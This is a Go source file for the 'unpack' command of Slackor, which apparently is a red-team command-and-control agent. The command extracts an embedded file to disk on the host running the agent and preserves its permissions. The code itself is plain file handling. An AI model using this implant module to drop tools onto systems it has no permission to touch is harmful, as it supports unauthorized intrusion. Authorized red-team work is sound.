package common

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"

	"github.com/pkg/errors"
	"github.com/rakyll/statik/fs"

	"github.com/Coalfire-Research/Slackor/pkg/command"

	// Loads the embedded file system
	_ "github.com/Coalfire-Research/Slackor/internal/statik"
)

// Unpack extracts a file from the embedded file system
type Unpack struct{}

// Name is the name of the command
func (u Unpack) Name() string {
	return "unpack"
}

// Run extracts a file from the embedded file system
func (u Unpack) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 && len(args) != 2 {
		return "", errors.New("unpack takes 1 or 2 arguments")
	}
	source := args[0]
	var destination string
	if len(args) == 2 {
		destination = args[1]
	} else {
		destination = "./"
	}

	statikFS, err := fs.New()
	if err != nil {
		return "", errors.Wrap(err, "unable to access embedded file system")
	}
	f, err := statikFS.Open(source)
	if err != nil {
		return "", errors.Wrapf(err, "unable to open source: %q", source)
	}
	info, err := f.Stat()
	if err != nil {
		return "", err
	}
	if destination[len(destination)-1:] == "/" ||
		destination[len(destination)-1:] == string(filepath.Separator) {

		// destination explicitly indicates it's a directory
		destination = filepath.Join(destination, info.Name())
	} else {
		destInfo, err := os.Stat(destination)
		if err != nil {
			return "", errors.Wrapf(err, "unable to get destination meta info: %q", destination)
		}
		if destInfo.IsDir() {
			destination = filepath.Join(destination, info.Name())
		} else {
			return "Destination exists and is not a directory. To replace it, explicitly rm it first.", nil
		}
	}
	df, err := os.Create(destination)
	if err != nil {
		return "", errors.Wrapf(err, "unable to create destination file: %q", destination)
	}
	defer df.Close()
	w := bufio.NewWriter(df)
	n, err := w.ReadFrom(f)
	if err != nil {
		return "", errors.Wrap(err, "error writing source to destination")
	}
	w.Flush()
	df.Sync()
	err = os.Chmod(destination, info.Mode())
	if err != nil {
		return "", errors.Wrapf(err, "error setting %s permissions on: %q", info.Mode().String(), destination)
	}
	return fmt.Sprintf("%d bytes written to %q with permissions %s.", n, destination, info.Mode().String()), nil
}

func init() {
	command.RegisterCommand(Unpack{})
}
